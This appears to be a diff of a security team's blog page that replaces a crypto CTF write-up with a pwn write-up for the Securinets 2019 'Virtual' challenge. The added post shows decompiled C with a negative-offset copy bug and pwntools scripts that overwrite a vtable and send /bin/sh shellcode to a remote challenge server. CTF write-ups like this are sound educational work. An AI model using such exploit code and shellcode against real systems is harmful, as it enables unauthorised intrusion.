@@ -11,7 +11,7 @@
 
 
 
-    <title>We Three Keys Writeup</title>
+    <title>Securinets 2019 Final - Virtual Pwn challenge</title>
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <!-- Styles'n'Scripts -->
@@ -45,7 +45,7 @@
 />
 <link
   rel="canonical"
-  href="/we-three-keys"
+  href="/securinets-final-virtual"
 />
 <meta name="referrer" content="no-referrer-when-downgrade" />
 
@@ -55,15 +55,15 @@
 <meta property="og:type" content="website" />
 <meta
   property="og:title"
-  content="We Three Keys Writeup"
+  content="Securinets 2019 Final - Virtual Pwn challenge"
 />
 <meta
   property="og:description"
-  content="We Three Keys was a fairly straightforward crypto challenge which required a bit of thinking, but was slightly disappointing in the end. The Challenge We’re given access to a server which lets us encrypt and decrypt any data. We can also pick which key out of any three keys we"
+  content="Blackfoot Security went to the Securinets CTF Final event @ Tunis the April 14 2019. Virtual was a pwn challenge that gaves us 467pts. Let’s first get some information about the binary and its behaviour: Checksec output: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE:"
 />
 <meta
   property="og:url"
-  content="/we-three-keys"
+  content="/securinets-final-virtual"
 />
 <meta
   property="og:image"
@@ -92,11 +92,11 @@
 <meta name="twitter:card" content="summary_large_image" />
 <meta
   name="twitter:title"
-  content="We Three Keys Writeup"
+  content="Securinets 2019 Final - Virtual Pwn challenge"
 />
 <meta
   name="twitter:description"
-  content="We Three Keys was a fairly straightforward crypto challenge which required a bit of thinking, but was slightly disappointing in the end. The Challenge We’re given access to a server which lets us encrypt and decrypt any data. We can also pick which key out of any three keys we"
+  content="Blackfoot Security went to the Securinets CTF Final event @ Tunis the April 14 2019. Virtual was a pwn challenge that gaves us 467pts. Let’s first get some information about the binary and its behaviour: Checksec output: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE:"
 />
 <meta name="twitter:url" content="/" />
 <meta
@@ -124,7 +124,7 @@
       "name": "Blackfoot Security",
       "logo": "/assets/images/blog-icon.png"
     },
-    "url": "/we-three-keys",
+    "url": "/securinets-final-virtual",
     "image": {
       "@type": "ImageObject",
       "url": "/assets/images/blog-icon.png",
@@ -133,9 +133,9 @@
     },
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "/we-three-keys"
+      "@id": "/securinets-final-virtual"
     },
-    "description": "We Three Keys was a fairly straightforward crypto challenge which required a bit of thinking, but was slightly disappointing in the end. The Challenge We’re given access to a server which lets us encrypt and decrypt any data. We can also pick which key out of any three keys we"
+    "description": "Blackfoot Security went to the Securinets CTF Final event @ Tunis the April 14 2019. Virtual was a pwn challenge that gaves us 467pts. Let’s first get some information about the binary and its behaviour: Checksec output: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE:"
   }
 </script>
 
@@ -151,7 +151,7 @@
 <link
   rel="alternate"
   type="application/rss+xml"
-  title="We Three Keys Writeup"
+  title="Securinets 2019 Final - Virtual Pwn challenge"
   href="/feed.xml"
 />
 
@@ -211,7 +211,7 @@ into the {body} of the default.hbs template -->
 <main id="site-main" class="site-main outer" role="main">
     <div class="inner">
 
-        <article class="post-full post tag-crypto tag-ctf ">
+        <article class="post-full post tag-pwn tag-ctf ">
 
             <header class="post-full-header">
                 <section class="post-full-meta">
@@ -228,86 +228,181 @@ into the {body} of the default.hbs template -->
                             
                         
                             
-                               <a href='/tag/crypto/'>CRYPTO</a>
+                               <a href='/tag/pwn/'>PWN</a>,
+                            
+                        
+                            
+                               <a href='/tag/cpp/'>CPP</a>,
+                            
+                        
+                            
+                               <a href='/tag/exploit/'>EXPLOIT</a>
                             
                         
                     
                 </section>
-                <h1 class="post-full-title">We Three Keys Writeup</h1>
+                <h1 class="post-full-title">Securinets 2019 Final - Virtual Pwn challenge</h1>
             </header>
 
             
-            <figure class="post-full-image" style="background-image: url(/assets/images/swampctf.png)">
+            <figure class="post-full-image" style="background-image: url(/assets/images/securinets.jpg)">
             </figure>
             
 
             <section class="post-full-content">
                 <div class="kg-card-markdown">
-                    <p>We Three Keys was a fairly straightforward crypto challenge which required a bit of thinking, but was slightly disappointing in the end.</p>
+                    <p>Blackfoot Security went to the Securinets CTF Final event @ Tunis the April 14 2019.</p>
 
-<h2 id="the-challenge">The Challenge</h2>
+<p>Virtual was a pwn challenge that gaves us <strong>467pts</strong>.</p>
 
-<p>We’re given access to a server which lets us encrypt and decrypt any data. We can also pick which key out of any three keys we want to use.</p>
+<p>Let’s first get some information about the binary and its behaviour:</p>
 
-<p>Supposedly the goal of the challenge is to figure out what the three keys are. We’re given the server code, and I’ll include the important part:</p>
+<p><img src="/assets/images/virtual/information.png" alt="Binary Information" /></p>
 
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypt_message</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">IV</span><span class="p">):</span>
-    <span class="o">...</span>
+<p>Checksec output:</p>
 
-<span class="k">def</span> <span class="nf">decrypt_message</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">IV</span><span class="p">):</span>
-    <span class="o">...</span>
-
-<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"1) Encrypt a message"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"2) Decrypt a message"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"3) Choose a new key"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"4) Exit"</span><span class="p">)</span>
-    <span class="n">choice</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">raw_input</span><span class="p">(</span><span class="s">"&lt;= "</span><span class="p">))</span>
-    <span class="k">if</span> <span class="n">choice</span> <span class="o">==</span> <span class="s">"1"</span><span class="p">:</span>
-        <span class="n">encrypt_message</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="s">"2"</span><span class="p">:</span>
-        <span class="n">decrypt_message</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">choice</span> <span class="o">==</span> <span class="s">"3"</span><span class="p">:</span>
-        <span class="n">key</span> <span class="o">=</span> <span class="n">new_key</span><span class="p">()</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">exit</span><span class="p">()</span>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
 </code></pre></div></div>
 
-<p>Wow, wait, they’re using the key as IV? That’s a very clear weakness right here.</p>
+<p>This is a pretty simple binary, allowing us to set our age and reading some bytes.</p>
 
-<h2 id="iv-vs-key">IV vs. Key</h2>
+<p>Let’s open the binary in Ghidra and see what is going on.</p>
 
-<p>IVs are sometimes misunderstood. IVs are meant to let you reuse a key between two encryption rounds. What they do is bring in an element of randomness to the encryption mechanism in AES_CBC, so that if I encrypt the same message twice with the same key, I can get different results using the same key.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cm">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>
+<span class="cm">/* Customizer::init() */</span>
 
-<p>Deriving the IV from the key is an awful idea becaue it completely negates the point of having an IV. I was hoping that this challenge would play on that fact, but the answer was much simplet than that and didn’t involve this weakness in any way, instead it simply was about acquiring the IV by using the CBC decryption mechanism.</p>
+<span class="kt">void</span> <span class="n">__thiscall</span> <span class="nf">init</span><span class="p">(</span><span class="n">Customizer</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
 
-<h2 id="cbc-decryption">CBC decryption</h2>
+<span class="p">{</span>
+  <span class="kt">short</span> <span class="n">age_cpy</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">user_inp</span><span class="p">;</span>
+  <span class="n">Customizer</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">sVar1</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
 
-<p>So I want to figure out the IV. The diagram below illustrates what AES_CBC decryption looks like:
-<img src="/assets/images/threekeys/cbcdec.png" alt="CBC decryption" /></p>
-
-<p>So to get the IV I need to solve:
-<code class="highlighter-rouge">IV = plaintext ^ unciphered</code></p>
-
-<p>Where <code class="highlighter-rouge">plaintext</code> is the final block of data post-xor, and <code class="highlighter-rouge">unciphered</code> is the data right after it’s been decrypted, but not xor’d. I’m always given the plaintext, so the real question is, how do I find the decryption output pre-xor?</p>
-
-<h2 id="solving-it">Solving it</h2>
-
-<p>Turns out the answer is pretty simple: I decrypt the same block, only composed of 0s, twice. The first block will get decrypted, then xor’d with the IV, and that’ll give me <code class="highlighter-rouge">plaintext</code>. The second block will also be decrypted, then every byte will be xor’d with <code class="highlighter-rouge">0</code>, which means every byte will remain the same - giving me <code class="highlighter-rouge">unciphered</code>.</p>
-
-<p>I was feeling lazy so I didn’t even write a script to do this three times, I did it manually and pasted the two blocks into this script each time:</p>
-
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p1</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">BLOCK1</span><span class="p">)</span>
-<span class="n">p2</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">BLOCK2</span><span class="p">)</span>
-
-<span class="n">r</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
-    <span class="n">r</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">p1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">p2</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span>
-
-<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="p">(</span><span class="o">**</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="o">**</span><span class="p">(</span><span class="kt">int</span> <span class="o">**</span><span class="p">)(</span><span class="n">this</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">this</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">));</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"But first, how old are you ?"</span><span class="p">);</span>
+  <span class="n">age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">age</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="mh">0x1e</span> <span class="o">&lt;</span> <span class="n">age</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// This is verifying if out age is over 0x1e but not if our age is less than 0 :)
+</span>    <span class="n">puts</span><span class="p">(</span><span class="s">"hemm you are too older for this chall :</span><span class="se">\\</span><span class="s">"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">age_cpy</span> <span class="o">=</span> <span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="n">age</span><span class="p">;</span>
+  <span class="n">user_inp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20202020</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">user_inp</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">user_inp</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">this</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">age_cpy</span><span class="p">),</span><span class="n">user_inp</span><span class="p">);</span> <span class="c1">// Copying user input in this + age
+</span>  <span class="n">__s</span> <span class="o">=</span> <span class="n">this</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">age_cpy</span><span class="p">;</span>
+  <span class="n">sVar1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">__s</span><span class="p">);</span>
+  <span class="n">__s</span><span class="p">[</span><span class="n">sVar1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Customizer</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+  <span class="n">trigger</span><span class="p">(</span><span class="n">this</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">__s</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 
-<p>The flag was <code class="highlighter-rouge">flag{w0w_wh4t_l4zy_k3yz_much_w34k_crypt0_f41ls!}</code></p>
+<p>As written as a comment in the source code, it is not possible as an attacker to overwrite too far after the object pointer…</p>
+
+<p>But the code does not check if we write before the pointer.</p>
+
+<p>In Fact, we may write <code class="highlighter-rouge">0x28</code> bytes before the <code class="highlighter-rouge">this</code> object.</p>
+
+<p>The goal will be to overwrite the vtable to control EIP when the object destruct itself.</p>
+
+<p>This will be possible by writing <code class="highlighter-rouge">-100</code> byte before <code class="highlighter-rouge">this</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+<span class="c">#</span>
+<span class="c"># Let's go now (:</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"tmux"</span><span class="p">,</span> <span class="s">"splitw"</span><span class="p">,</span> <span class="s">"-h"</span><span class="p">]</span>
+
+    <span class="n">s</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">"./virtual"</span><span class="p">,</span> <span class="s">"c</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c"># Sending age</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">))</span>
+
+    <span class="c"># Making payload</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">4</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xDEADBEEF</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/virtual/deadbeef.png" alt="Crash" /></p>
+
+<p>So now, we have a crash. We also know that there is no boring protection useful since the program is allocating us some bytes at the address <code class="highlighter-rouge">0x20202020</code>.</p>
+
+<p>As show on the screenshot below, our buffer is mapped <code class="highlighter-rouge">rwx</code> at <code class="highlighter-rouge">0x20202020</code>.</p>
+
+<p><img src="/assets/images/virtual/vmmap.png" alt="VMMap" /></p>
+
+<p>Using a basic 32bits /bin/sh shellcode will get us a shell.</p>
+
+<blockquote>
+  <p>We use 0xcc to make sure our shellcode is executed locally</p>
+</blockquote>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+<span class="c">#</span>
+<span class="c"># @SakiiR</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"tmux"</span><span class="p">,</span> <span class="s">"splitw"</span><span class="p">,</span> <span class="s">"-h"</span><span class="p">]</span>
+
+    <span class="c"># s = gdb.debug("./virtual", "c\n")</span>
+    <span class="c"># s = process("./virtual")</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"3.86.187.67"</span><span class="p">,</span> <span class="mi">6666</span><span class="p">)</span>
+
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="s">"</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x73\x68\x68\x2f\x62\x69\x6e\x89</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\xe3\xb0\x0b\xcd\x80</span><span class="s">"</span>
+    <span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">))</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">4</span>
+    <span class="c"># +8 to go after the first A and the return address.</span>
+    <span class="c"># -0x20 because the addresse is computed like that in the destructor</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">((</span><span class="mh">0x20202020</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+    <span class="c"># payload += "\xcc" # useless now :)</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+
+</code></pre></div></div>
 
                 </div>
             </section>
@@ -319,21 +414,6 @@ into the {body} of the default.hbs template -->
                 <!-- Everything inside the #author tags pulls data from the author -->
                 <!-- #author-->
                 
-                    
-                        <section class="author-card">
-                            
-                                <img class="author-profile-image" src="/assets/images/navenn_t.jpg" alt="atomheartother" />
-                            
-                            <section class="author-card-content">
-                                <h4 class="author-card-name"><a href="/author/atomheartother">Thomas Navennec</a></h4>
-                                
-                                    <p>Software developer and chill hacker for Blackfoot</p>
-                                
-                            </section>
-                        </section>
-                        <div class="post-full-footer-right">
-                            <a class="author-card-button" href="/author/atomheartother">Read More</a>
-                        </div>
                     
                 
                     
@@ -379,14 +459,14 @@ into the {body} of the default.hbs template -->
                                 
                                   
                                     
-                                        
-                                        
-                                            <li><a href="/securinets-final-virtual">Securinets 2019 Final - Virtual Pwn challenge</a></li>
-                                        
-                                    
                                   
                                 
                                   
+                                    
+                                        
+                                        
+                                            <li><a href="/we-three-keys">We Three Keys Writeup</a></li>
+                                        
                                     
                                   
                                 
@@ -414,66 +494,6 @@ into the {body} of the default.hbs template -->
 
             <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
             
-                
-
-    <article class="post-card post-template">
-        
-            <a class="post-card-image-link" href="/securinets-final-virtual">
-                <div class="post-card-image" style="background-image: url(/assets/images/securinets.jpg)"></div>
-            </a>
-        
-        <div class="post-card-content">
-            <a class="post-card-content-link" href="/securinets-final-virtual">
-                <header class="post-card-header">
-                    
-                        
-                            
-                               <span class="post-card-tags">Writeup</span>
-                            
-                        
-                            
-                               <span class="post-card-tags">Ctf</span>
-                            
-                        
-                            
-                               <span class="post-card-tags">Pwn</span>
-                            
-                        
-                            
-                               <span class="post-card-tags">Cpp</span>
-                            
-                        
-                            
-                                <span class="post-card-tags">Exploit</span>
-                            
-                        
-                    
-
-                    <h2 class="post-card-title">Securinets 2019 Final - Virtual Pwn challenge</h2>
-                </header>
-                <section class="post-card-excerpt">
-                    
-                        <p></p>
-                    
-                </section>
-            </a>
-            <footer class="post-card-meta">
-                
-                    
-                
-                    
-                
-                <span class="reading-time">
-                    
-                    
-                      1 min read
-                    
-                </span>
-            </footer>
-        </div>
-    </article>
-
-            
 
             <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
             
@@ -481,12 +501,12 @@ into the {body} of the default.hbs template -->
 
     <article class="post-card post-template">
         
-            <a class="post-card-image-link" href="/securinets-maze">
-                <div class="post-card-image" style="background-image: url(/assets/images/securinets.jpg)"></div>
+            <a class="post-card-image-link" href="/we-three-keys">
+                <div class="post-card-image" style="background-image: url(/assets/images/swampctf.png)"></div>
             </a>
         
         <div class="post-card-content">
-            <a class="post-card-content-link" href="/securinets-maze">
+            <a class="post-card-content-link" href="/we-three-keys">
                 <header class="post-card-header">
                     
                         
@@ -504,7 +524,7 @@ into the {body} of the default.hbs template -->
                         
                     
 
-                    <h2 class="post-card-title">Securinets2019 Maze</h2>
+                    <h2 class="post-card-title">We Three Keys Writeup</h2>
                 </header>
                 <section class="post-card-excerpt">
                     
@@ -552,18 +572,18 @@ into the {body} of the default.hbs template -->
         </a>
     </div>
     <span class="floating-header-divider">&mdash;</span>
-    <div class="floating-header-title">We Three Keys Writeup</div>
+    <div class="floating-header-title">Securinets 2019 Final - Virtual Pwn challenge</div>
     <div class="floating-header-share">
         <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
     <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
 </svg>
 </div>
-        <a class="floating-header-share-tw" href="https://twitter.com/share?text=We+Three+Keys+Writeup&amp;url=https://blackfootsecurity.github.io/we-three-keys"
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Securinets+2019+Final+-+Virtual+Pwn+challenge&amp;url=https://blackfootsecurity.github.io/securinets-final-virtual"
             onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
 
         </a>
-        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blackfootsecurity.github.io/we-three-keys"
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blackfootsecurity.github.io/securinets-final-virtual"
             onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
 
